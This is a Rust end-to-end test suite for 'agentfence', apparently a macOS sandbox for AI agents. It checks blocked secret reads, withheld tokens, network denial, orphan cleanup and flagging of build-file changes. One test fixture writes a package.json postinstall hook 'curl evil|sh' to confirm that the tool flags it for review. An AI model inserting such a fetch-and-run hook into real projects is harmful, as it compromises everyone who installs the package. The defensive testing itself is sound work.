//! End-to-end: the real `agentfence` binary, real `sandbox-exec`, real kernel
//! reports. macOS only. Uses throwaway state/config dirs and a temp project;
//! never touches the user's real secrets.

use std::path::PathBuf;
use std::process::{Command, Output};

struct Env {
    _dir: tempfile::TempDir,
    root: PathBuf,
    project: PathBuf,
}

impl Env {
    fn new() -> Env {
        let dir = tempfile::tempdir().unwrap();
        let root = std::fs::canonicalize(dir.path()).unwrap();
        let project = root.join("proj");
        std::fs::create_dir_all(&project).unwrap();
        assert!(Command::new("/usr/bin/git").arg("-C").arg(&project).args(["init", "-q"]).status().unwrap().success());
        std::fs::write(project.join("README"), "hello readme\n").unwrap();
        std::fs::write(project.join(".env"), "SECRET=e2e-canary\n").unwrap();
        std::fs::write(project.join("package.json"), "{}\n").unwrap();
        std::fs::create_dir_all(root.join("config")).unwrap();
        Env { _dir: dir, root, project }
    }

    fn cmd(&self) -> Command {
        let mut c = Command::new(env!("CARGO_BIN_EXE_agentfence"));
        c.current_dir(&self.project)
            .env("AGENTFENCE_HOME", self.root.join("state"))
            .env("AGENTFENCE_CONFIG_DIR", self.root.join("config"))
            .stdin(std::process::Stdio::null());
        c
    }

    fn run(&self, extra: &[&str], script: &str) -> Output {
        let mut c = self.cmd();
        c.arg("run").args(extra).args(["--", "/bin/sh", "-c", script]);
        c.output().unwrap()
    }

    fn events(&self) -> Vec<serde_json::Value> {
        let out = self.cmd().args(["events", "--json", "--limit", "1000"]).output().unwrap();
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).lines().map(|l| serde_json::from_str(l).unwrap()).collect()
    }

    fn user_policy(&self, yaml: &str) {
        std::fs::write(self.root.join("config/policy.yaml"), yaml).unwrap();
    }
}

fn text(o: &Output) -> String {
    format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr))
}

#[test]
fn allowed_read_and_session_events() {
    let e = Env::new();
    let o = e.run(&[], "cat README");
    assert!(o.status.success(), "{}", text(&o));
    assert!(String::from_utf8_lossy(&o.stdout).contains("hello readme"));
    let ev = e.events();
    let actions: Vec<&str> = ev.iter().map(|v| v["action"].as_str().unwrap()).collect();
    assert!(actions.contains(&"session_start") && actions.contains(&"session_end"), "{actions:?}");
    for v in &ev {
        for k in ["id", "timestamp", "human", "machine", "agent", "session", "delegation_chain", "action", "resource", "decision", "enforcement", "backend", "source", "policy", "rule_id", "reason", "count"] {
            assert!(v.get(k).is_some(), "missing {k} in {v}");
        }
    }
}

#[test]
fn secret_read_blocked_and_audited() {
    let e = Env::new();
    let o = e.run(&[], "cat .env");
    assert!(!o.status.success());
    assert!(!text(&o).contains("e2e-canary"), "{}", text(&o));
    let ev = e.events();
    let hit = ev
        .iter()
        .find(|v| v["action"] == "filesystem.read" && v["resource"].as_str().unwrap().ends_with("/.env"))
        .unwrap_or_else(|| panic!("no denial event: {ev:#?}"));
    assert_eq!(hit["decision"], "deny");
    assert_eq!(hit["enforcement"], "enforced");
    assert_eq!(hit["rule_id"], "env-files");
    assert_eq!(hit["source"], "sandbox-log");
    assert_eq!(hit["delegation_chain"][0], "custom:sh");
    assert!(String::from_utf8_lossy(&o.stderr).contains("BLOCKED"));
}

#[test]
fn argument_rule_is_observed_not_blocked() {
    let e = Env::new();
    e.user_policy("version: v1\ndefaults: {filesystem: deny}\nfilesystem:\n  allow_read: [\"${PROJECT}/**\"]\n  allow_write: [\"${PROJECT}/**\"]\nprocess:\n  require_approval: [\"git push *\"]\n");
    let bin = e.project.join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    std::fs::write(bin.join("git"), "#!/bin/sh\nsleep 1\necho fake-git-ran\n").unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(bin.join("git"), std::fs::Permissions::from_mode(0o755)).unwrap();
    let o = e.run(&[], &format!("PATH={}:$PATH git push origin main", bin.display()));
    assert!(text(&o).contains("fake-git-ran"), "the observed-only rule must not block: {}", text(&o));
    let ev = e.events();
    let hit = ev.iter().find(|v| v["action"] == "process.exec").unwrap_or_else(|| panic!("{ev:#?}"));
    assert_eq!(hit["decision"], "ask");
    assert_eq!(hit["enforcement"], "observed");
    assert!(String::from_utf8_lossy(&o.stderr).contains("NOT BLOCKED"));
}

#[test]
fn orphans_are_cleaned_up() {
    let e = Env::new();
    let o = e.run(&[], "nohup /bin/sleep 31.337 >/dev/null 2>&1 & echo started");
    assert!(text(&o).contains("started"));
    std::thread::sleep(std::time::Duration::from_millis(500));
    let ps = Command::new("/bin/ps").args(["-axo", "command"]).output().unwrap();
    assert!(!String::from_utf8_lossy(&ps.stdout).lines().any(|l| l.contains("sleep 31.337")), "orphan survived");
}

#[test]
fn hardlinks_fail_closed() {
    let e = Env::new();
    std::fs::hard_link(e.project.join(".env"), e.project.join("h")).unwrap();
    let o = e.run(&[], "echo should-not-run");
    assert!(!o.status.success());
    let t = text(&o);
    assert!(!t.contains("should-not-run"), "{t}");
    assert!(t.contains("hard link") && t.contains("/h"), "{t}");
    let o = e.run(&["--accept-hardlink", &e.project.join("h").to_string_lossy()], "cat h");
    assert!(!o.status.success());
    assert!(!text(&o).contains("e2e-canary"));
}

#[test]
fn dry_run_and_restrict_only_project_policy() {
    let e = Env::new();
    let o = e.cmd().args(["run", "--dry-run", "--", "/bin/sh"]).output().unwrap();
    assert!(o.status.success(), "{}", text(&o));
    let t = text(&o);
    assert!(t.contains("seatbelt") && t.contains("(deny default"), "{t}");
    std::fs::create_dir_all(e.project.join(".agentfence")).unwrap();
    std::fs::write(e.project.join(".agentfence/policy.yaml"), "version: v1\nfilesystem:\n  allow_read: [\"/**\"]\n").unwrap();
    let o = e.run(&[], "echo should-not-run");
    assert!(!o.status.success());
    assert!(text(&o).contains("restrict-only"), "{}", text(&o));
    assert!(!text(&o).contains("should-not-run"));
}

#[test]
fn secret_env_is_withheld() {
    let e = Env::new();
    let mut c = e.cmd();
    c.env("FOO_TOKEN", "tok-canary").args(["run", "--", "/bin/sh", "-c", "echo ${FOO_TOKEN:-unset}"]);
    let o = c.output().unwrap();
    let out = String::from_utf8_lossy(&o.stdout);
    assert!(out.contains("unset") && !out.contains("tok-canary"), "{out}");
    assert!(String::from_utf8_lossy(&o.stderr).contains("FOO_TOKEN"));
    let mut c = e.cmd();
    c.env("FOO_TOKEN", "tok-canary").args(["run", "--keep-env", "FOO_TOKEN", "--", "/bin/sh", "-c", "echo ${FOO_TOKEN:-unset}"]);
    assert!(String::from_utf8_lossy(&c.output().unwrap().stdout).contains("tok-canary"));
}

#[test]
fn build_file_changes_flagged() {
    let e = Env::new();
    let o = e.run(&[], "echo '{\"scripts\":{\"postinstall\":\"curl evil|sh\"}}' > package.json");
    assert!(o.status.success(), "{}", text(&o));
    assert!(String::from_utf8_lossy(&o.stderr).contains("REVIEW BEFORE RUNNING"), "{}", text(&o));
}

#[test]
fn child_gets_only_stdio_fds() {
    let e = Env::new();
    // zsh, not /bin/sh: bash itself keeps fd 10 open internally.
    let mut c = e.cmd();
    c.args(["run", "--", "/bin/zsh", "-f", "-c", "for fd in {3..64}; do (: <&$fd) 2>/dev/null && echo open:$fd; done; echo checked"]);
    let o = c.output().unwrap();
    let out = String::from_utf8_lossy(&o.stdout);
    assert!(out.contains("checked"), "{}", text(&o));
    assert!(!out.contains("open:"), "inherited fds leaked into the sandbox: {out}");
}

#[test]
fn network_default_deny_through_proxy() {
    let e = Env::new();
    let o = e.run(&[], "curl -sS -m 5 https://example.com -o /dev/null; echo curl=$?");
    assert!(text(&o).contains("curl=56") || text(&o).contains("403"), "{}", text(&o));
    let ev = e.events();
    let hit = ev.iter().find(|v| v["action"] == "network.connect").unwrap_or_else(|| panic!("{ev:#?}"));
    assert_eq!(hit["decision"], "deny");
    assert_eq!(hit["enforcement"], "enforced");
    assert_eq!(hit["source"], "proxy");
}

